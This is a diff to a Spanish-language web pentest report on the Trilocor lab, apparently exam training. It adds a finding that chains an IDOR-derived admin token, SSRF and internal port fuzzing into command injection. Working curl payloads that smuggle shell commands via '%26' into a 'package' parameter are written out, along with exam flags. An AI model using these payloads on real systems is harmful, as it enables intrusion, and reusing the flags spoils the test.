@@ -1,18 +1,19 @@
 # Trilocor — Web Application Security Assessment
 
-**Cliente / Entorno:** Trilocor (laboratorio CWES) **IP:** `10.129.248.61` **Hosts (`/etc/hosts`):** `trilocor.local`, `www.trilocor.local`, `admin.trilocor.local` **Fecha:** Junio 2026 **Alcance:** Seis aplicaciones web independientes (contenedores separados) sobre la misma IP, incluyendo la tienda Trilocor Shop (`:9000`).
+**Cliente / Entorno:** Trilocor (laboratorio CWES) **IP:** `10.129.248.107` **Hosts (`/etc/hosts`):** `trilocor.local`, `www.trilocor.local`, `admin.trilocor.local` **Fecha:** Junio 2026 **Alcance:** Seis aplicaciones web independientes (contenedores separados) sobre la misma IP, incluyendo la tienda Trilocor Shop (`:9000`).
 
-> Nota de direccionamiento: la IP de la máquina objetivo cambió entre sesiones del laboratorio (reasignación de DHCP), pero corresponde a un único host. Todas las referencias se normalizan a la IP vigente: `10.129.248.61`.
+> Nota de direccionamiento: la IP de la máquina objetivo cambió entre sesiones del laboratorio (reasignación de DHCP), pero corresponde a un único host. Todas las referencias se normalizan a la IP vigente: `10.129.248.107`.
 
 ---
 
 ## 1. Resumen ejecutivo
 
-Se evaluaron seis aplicaciones web del entorno Trilocor. Se identificaron **ocho hallazgos**, de los cuales **cinco son de severidad crítica** (cuatro derivan en ejecución remota de código). Las aplicaciones comparten un conjunto de debilidades recurrentes:
+Se evaluaron seis aplicaciones web del entorno Trilocor. Se identificaron **nueve hallazgos**, de los cuales **seis son de severidad crítica** (cinco derivan en ejecución remota de código). Las aplicaciones comparten un conjunto de debilidades recurrentes:
 
 - **Validación de entrada dependiente del método HTTP.** En la app HR (8088), los filtros de seguridad se aplican solo a una rama (GET o POST) dejando la otra expuesta — patrón que habilitó tanto el bypass de autenticación como el LFI→RCE.
 - **Inyección SQL por concatenación directa** en dos aplicaciones distintas (HR 8088 y Jobs 8080), una de ellas escalada a RCE mediante `INTO OUTFILE`.
 - **Control de acceso roto a nivel de objeto (IDOR/BOLA).** En la app Shop (9000), el endpoint de emisión de tokens confía en el `uid`/`username` del cuerpo de la petición en lugar de la sesión, permitiendo suplantar al `administrator`.
+- **SSRF con pivote a un servicio interno vulnerable.** El endpoint `healthcheck` del Shop consulta URLs arbitrarias server-side (sin allowlist) y reenvía la query string, alcanzando un _helper_ interno (9090) con command injection → RCE en un host no expuesto.
 - **Gestión de credenciales y sesiones deficiente:** tokens de reset triviales (4 dígitos sin throttling), contraseñas débiles derivadas del username, reutilización de credenciales entre servicios, y cookies de sesión sin `HttpOnly`.
 - **Componentes desactualizados:** WordPress con un plugin a medida vulnerable a Stored XSS y Elementor 3.7.7 afectado por CVE-2023-48777 (RCE).
 
@@ -34,24 +35,26 @@ El impacto agregado es el **compromiso total** de múltiples aplicaciones: ejecu
 |6|SQL Injection (UNION) → RCE vía `INTO OUTFILE`|Jobs Portal — `8080`|Crítica|RCE `apache`|
 |7|Enumeración WP + credencial débil (XML-RPC) → panel admin|PR Admin — `8009`|Alta|Acceso panel `/admin`|
 |9|Broken Object Level Authorization (IDOR) en `/api/tokens` → acceso admin|Trilocor Shop — `9000`|Alta|Token + flag de `administrator`|
+|10|SSRF (`/api/admin/healthcheck`) → Command Injection en servicio interno (`9090`)|Trilocor Shop — `9000` → interno `9090`|Crítica|RCE en host interno + flag|
 
 ---
 
 ## 2.1 — Flags obtenidas (por tarea del examen)
 
-> El examen consta de varias tareas; algunas comparten cadena de explotación (p. ej. el acceso de la tarea 1 y el RCE de la tarea 2 parten ambos del WordPress). La **tarea 8** (XXE / PR admin) se omitió en esta corrida y queda pendiente; la **tarea 9** (Trilocor Shop) se resolvió y se documenta en el Hallazgo 9.
+> El examen consta de varias tareas; algunas comparten cadena de explotación (p. ej. el acceso de la tarea 1 y el RCE de la tarea 2 parten ambos del WordPress). La **tarea 8** (PR admin) se omitió en esta corrida y queda pendiente; la **tarea 9** (Trilocor Shop) se resolvió y se documenta en el Hallazgo 9.
 
-| Tarea | Objetivo                                      | Hallazgo | Flag                               |
-| ----- | --------------------------------------------- | -------- | ---------------------------------- |
-| 1     | Acceso al admin dashboard de la web principal | 1        | `b2641186f0add94dc7d7845d82550047` |
-| 2     | RCE en la web principal → `.txt` en `/`       | 2        | `ff01bfb24eb5f1746c6bdfba5b7efee3` |
-| 3     | Bypass del login del HR dashboard             | 3        | `f94f3cd14bc0b690fe3a437f7becbcd2` |
-| 4     | RCE en el HR dashboard → `.txt` en `/`        | 4        | `4527e8cbacb4a6f4023154dfa604bccf` |
-| 5     | Acceso al panel admin del Jobs Portal         | 5        | `de0344e95fc7c8346fea9e617438bb73` |
-| 6     | RCE en el Jobs Portal → `.txt` en `/`         | 6        | `3d9358f76943c092465963bad922f822` |
-| 7     | Acceso al panel PR admin                      | 7        | `8711ea1e4574e9c78f28b696da3e0a39` |
-| 8     | PR admin                                      | —        | _(pendiente / omitida)_            |
-| 9     | Acceso admin en Trilocor Shop → leer la flag  | 9        | `42972588ec91464a86d31090a4fb994c` |
+|Tarea|Objetivo|Hallazgo|Flag|
+|---|---|---|---|
+|1|Acceso al admin dashboard de la web principal|1|`b2641186f0add94dc7d7845d82550047`|
+|2|RCE en la web principal → `.txt` en `/`|2|`ff01bfb24eb5f1746c6bdfba5b7efee3`|
+|3|Bypass del login del HR dashboard|3|`f94f3cd14bc0b690fe3a437f7becbcd2`|
+|4|RCE en el HR dashboard → `.txt` en `/`|4|`4527e8cbacb4a6f4023154dfa604bccf`|
+|5|Acceso al panel admin del Jobs Portal|5|`de0344e95fc7c8346fea9e617438bb73`|
+|6|RCE en el Jobs Portal → `.txt` en `/`|6|`3d9358f76943c092465963bad922f822`|
+|7|Acceso al panel PR admin|7|`8711ea1e4574e9c78f28b696da3e0a39`|
+|8|PR admin|—|_(pendiente / omitida)_|
+|9|Acceso admin en Trilocor Shop → leer la flag|9|`42972588ec91464a86d31090a4fb994c`|
+|10|RCE en host interno vía SSRF + command injection → leer la flag|10|`8cca521dc144b2df676e7d9738e278a3`|
 
 ---
 
@@ -61,11 +64,11 @@ El impacto agregado es el **compromiso total** de múltiples aplicaciones: ejecu
 
 ```bash
 # /etc/hosts
-10.129.248.61   trilocor.local www.trilocor.local admin.trilocor.local
+10.129.248.107   trilocor.local www.trilocor.local admin.trilocor.local
 
 # Enumeración de vhosts
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-  -H "Host: FUZZ.trilocor.local" -u http://10.129.248.61/ -fw 5194 -t 100
+  -H "Host: FUZZ.trilocor.local" -u http://10.129.248.107/ -fw 5194 -t 100
 # -> admin
 
 # Servidor
@@ -546,7 +549,7 @@ ffuf -w /usr/share/seclists/Usernames/Names/admin-users.txt \
 curl -s -X POST "$T/api/tokens" \
   -H 'Content-Type: application/json' -H "Cookie: PHPSESSID=$SID" \
   -d '{"uid":"1","username":"administrator"}'
-# -> {"token":"<token de administrator>","flag":"<flag>"}
+# -> {"token":"<token de administrator>","flag":"42972588ec91464a86d31090a4fb994c"}
 ```
 
 ### Nota metodológica — Burp
@@ -566,6 +569,96 @@ Suplantación de cualquier usuario por su `uid`, incluido `administrator`: emisi
 
 ---
 
+## Hallazgo 10 — SSRF en `/api/admin/healthcheck` → Command Injection en servicio interno (9090) → RCE (Trilocor Shop)
+
+**Host:** `www.trilocor.local:9000` (Trilocor Shop) → servicio interno `127.0.0.1:9090` **Endpoint de entrada:** `POST /api/admin/healthcheck` — **Parámetro:** `url` (SSRF) **Vulnerabilidad final:** OS Command Injection en el parámetro `package` del servicio interno **Tipo:** Server-Side Request Forgery (**CWE-918**, OWASP A10:2021) → OS Command Injection (**CWE-78**, OWASP A03:2021) **Severidad:** Crítica — **Resultado:** RCE en el host interno y lectura de la flag **Precondición:** token admin obtenido en el **Hallazgo 9** (IDOR de `/api/tokens`). **Tarea del examen:** flag 10.
+
+### Resumen
+
+Desde el `dashboard` del Shop, el código fuente referencia `assets/js/api.js`, que expone la superficie de la API —incluyendo endpoints administrativos `/api/admin/*`—. El modelo de autorización de esos endpoints es la raíz que encadena todo: **no usan la cookie de sesión**, sino un `uuid` (token) que se envía en el cuerpo JSON. Ese token es justamente el que se obtiene suplantando al `administrator` por el IDOR del Hallazgo 9, de modo que **poseer el token admin habilita todos los `/api/admin/*`**.
+
+Uno de esos endpoints, `/api/admin/healthcheck`, recibe una `url` y la consulta **desde el servidor** sin validación de destino → **SSRF**. Esto permite alcanzar servicios de loopback no expuestos al exterior. Enumerando puertos internos se descubre un servicio en **`9090`**: un _helper_ de gestión de paquetes que recibe sus parámetros por query string. Como el SSRF **reenvía también la query string** al servicio interno, el atacante controla esos parámetros. El comando `install` concatena el valor de `package` en una orden de shell (`pip install <package>`) **sin sanitizar**, de forma que un separador de shell (`&`) inyecta y ejecuta un comando arbitrario → **RCE** en el host interno, usado para listar `/` y leer el archivo de flag.
+
+### Cadena de explotación
+
+`IDOR (token admin, H9)` → `SSRF (healthcheck)` → `enumeración de puertos internos (→ 9090)` → `command injection en 'package'` → `RCE / lectura de flag`.
+
+### Por qué funciona (raíz)
+
+- **Autorización por token en el cuerpo, sin atar a la sesión:** los `/api/admin/*` confían en un `uuid` portador (_bearer_) que no se vincula al usuario autenticado. Es la misma falla del Hallazgo 9 reutilizada: la identidad/autorización se decide con datos que controla el cliente.
+- **SSRF sin allowlist de destino:** `healthcheck` no restringe el `url` a destinos permitidos, así que loopback (`localhost`, `127.0.0.1`) y rangos internos son alcanzables. Además **propaga la query string** al backend, dándole al atacante el control de los parámetros del servicio interno.
+- **Command Injection en el servicio interno:** `package` se interpola en una orden de shell. El `&` (enviado URL-encodeado como `%26` para que no parta la query string del SSRF, sino que viaje dentro del valor de `package`) cierra el `pip install` previo y ejecuta el comando inyectado. El mensaje residual _"Defaulting to user installation…"_ confirma que el `pip install` real corrió en segundo plano.
+
+### Reproducción
+
+```bash
+T="http://www.trilocor.local:9000"
+SID="qtt3qnes9mel5fm4b1lncvt9gj"               # PHPSESSID de la sesión propia
+UUID="f19d77c3-753c-48d6-9430-4d1a09aea67d"    # token 'administrator' del Hallazgo 9
+
+# 1) Descubrir la superficie de la API desde el dashboard
+curl -s "$T/dashboard" | grep -oE 'assets/js/[a-z]+\.js'      # -> assets/js/api.js
+curl -s "$T/assets/js/api.js" | grep -oE '/api/[a-z/_]+' | sort -u
+# -> /api/tokens /api/settings/edit /api/projects/add /api/projects/edit
+#    /api/admin /api/admin/list_members /api/admin/healthcheck /api/admin/add_product
+#    (los /api/admin/* se autentican solo con {"uuid":"<token>"} en el body, no con la cookie)
+
+# 2) Confirmar SSRF: el servidor consulta la URL que le indico
+curl -s -X POST "$T/api/admin/healthcheck" \
+  -H 'Content-Type: application/json' -H "Cookie: PHPSESSID=$SID" \
+  -d "{\"url\":\"http://localhost\",\"uuid\":\"$UUID\"}"
+
+# 3) Enumerar puertos internos vía SSRF
+ffuf -u "$T/api/admin/healthcheck" -X POST \
+  -H "Content-Type: application/json" -H "Cookie: PHPSESSID=$SID" \
+  -d "{\"url\":\"http://127.0.0.1:FUZZ\",\"uuid\":\"$UUID\"}" \
+  -w <(seq 1 65535) -t 3 -rate 8 -p 0.2-0.6 -ac
+# -> 9090 (servicio interno no expuesto al exterior)
+```
+
+```bash
+# 4) Fingerprint del servicio interno 9090 (el SSRF reenvía la query string)
+curl -s -X POST 'http://www.trilocor.local:9000/api/admin/healthcheck' \
+  -H 'Content-Type: application/json' -H 'Cookie: PHPSESSID=qtt3qnes9mel5fm4b1lncvt9gj' \
+  -d '{"url":"http://localhost:9090", "uuid":"f19d77c3-753c-48d6-9430-4d1a09aea67d"}'
+# -> {"status":"success","message":"Missing parameter - help"}
+
+curl -s -X POST 'http://www.trilocor.local:9000/api/admin/healthcheck' \
+  -H 'Content-Type: application/json' -H 'Cookie: PHPSESSID=qtt3qnes9mel5fm4b1lncvt9gj' \
+  -d '{"url":"http://localhost:9090?help", "uuid":"f19d77c3-753c-48d6-9430-4d1a09aea67d"}'
+# -> Help Menu: list / install / uninstall   (helper de paquetes: 'install' toma package=)
+```
+
+```bash
+# 5) Command Injection en 'package': '&' (=%26) cierra el comando y ejecuta el siguiente
+#    (opcional, para confirmar identidad del proceso: package=$%26/usr/bin/id)
+curl -s -X POST 'http://www.trilocor.local:9000/api/admin/healthcheck' \
+  -H 'Content-Type: application/json' -H 'Cookie: PHPSESSID=qtt3qnes9mel5fm4b1lncvt9gj' \
+  -d '{"url":"http://localhost:9090?install&package=$%26/bin/ls%20/", "uuid":"f19d77c3-753c-48d6-9430-4d1a09aea67d"}'
+# -> 90982c0e10ca39e2450ab06c673f2c2a.txt<br>bin<br>boot<br> ... (listado de /)
+
+# 6) Leer la flag
+curl -s -X POST 'http://www.trilocor.local:9000/api/admin/healthcheck' \
+  -H 'Content-Type: application/json' -H 'Cookie: PHPSESSID=qtt3qnes9mel5fm4b1lncvt9gj' \
+  -d '{"url":"http://localhost:9090?install&package=$%26/bin/cat%20/90982c0e10ca39e2450ab06c673f2c2a.txt", "uuid":"f19d77c3-753c-48d6-9430-4d1a09aea67d"}'
+# -> 8cca521dc144b2df676e7d9738e278a3
+```
+
+> Notas operativas: el `-ac` (auto-calibration) de ffuf descarta el tamaño de respuesta base y deja ver solo el puerto que responde distinto. El `$` antes del `%26` actúa como terminador inocuo del nombre de paquete; lo que inyecta es el `&`. Codificar `&` como `%26` y el espacio como `%20` es imprescindible para que viajen dentro del valor de `package` y no rompan ni la query del SSRF ni el JSON. Para comandos con varias palabras, separar con `%20`.
+
+### Impacto
+
+Ejecución remota de comandos en un host interno que **no estaba expuesto** al exterior, alcanzado puenteando la segmentación de red mediante SSRF. Permite lectura de archivos arbitrarios (incluida la flag), reconocimiento de la red interna y pivote hacia otros servicios de loopback. Combinado con el Hallazgo 9, la cadena completa parte de una cuenta registrada sin privilegios y llega a RCE interno.
+
+### Remediación
+
+- **SSRF:** validar el `url` de `healthcheck` con allowlist estricta de destinos; bloquear loopback, enlaces locales y rangos privados (`127.0.0.0/8`, `::1`, `169.254.0.0/16`, `10/8`, `172.16/12`, `192.168/16`); resolver y re-verificar el host tras el DNS; **no** reenviar la query string controlada por el cliente al backend.
+- **Command Injection (servicio 9090):** nunca construir comandos de shell por concatenación; usar APIs que reciban argumentos como arreglo (sin shell) y allowlist de nombres de paquete; descartar metacaracteres.
+- **Autorización:** atar los endpoints `/api/admin/*` a la sesión y al rol del usuario, no a un token portador enviado en el cuerpo (ver Hallazgo 9).
+- **Arquitectura:** segmentar y autenticar los servicios internos (el _helper_ de 9090 no debería ser invocable sin autenticación ni aceptar comandos por query string); mínimo privilegio del proceso.
+
+---
+
 ## 5. Conclusiones
 
 El entorno Trilocor presenta debilidades sistémicas más allá de los fallos individuales. El hilo común es **confiar en la entrada del cliente para una decisión de seguridad**, ya sea el método HTTP, los caracteres de una consulta o la identidad del dueño de un recurso:
@@ -575,5 +668,6 @@ El entorno Trilocor presenta debilidades sistémicas más allá de los fallos in
 3. **Control de acceso a nivel de objeto (IDOR/BOLA)** (Hallazgo 9) — la autorización delegada en un identificador (`uid`) controlado por el cliente; misma raíz que los Hallazgos 3 y 4, corregible derivando la identidad de la sesión y validando autorización por objeto.
 4. **Gestión de credenciales y sesiones** (Hallazgos 1, 5, 7) — cookies sin `HttpOnly`, tokens débiles, contraseñas adivinables y reutilización entre servicios.
 5. **Componentes desactualizados** (Hallazgos 1 y 2) — el parcheo de Elementor y la revisión del plugin a medida eliminan dos vías a RCE.
+6. **SSRF y exposición de servicios internos** (Hallazgo 10) — un endpoint que consulta URLs arbitrarias server-side, sin allowlist y reenviando la query string, convierte la segmentación de red en una barrera ilusoria y alcanza un servicio interno con command injection. La defensa es doble: restringir el destino del SSRF y no construir comandos de shell por concatenación en los servicios internos.
 
-Prioridad de remediación: los cuatro caminos a RCE (Hallazgos 2, 4, 6 y el potencial del 3) primero, por su impacto de compromiso total; luego el control de acceso a nivel de objeto (Hallazgo 9), el endurecimiento de credenciales/sesiones y la actualización de componentes.
+Prioridad de remediación: los cinco caminos a RCE (Hallazgos 2, 4, 6, 10 y el potencial del 3) primero, por su impacto de compromiso total; luego el control de acceso a nivel de objeto (Hallazgos 9 y 10), el endurecimiento de credenciales/sesiones y la actualización de componentes.
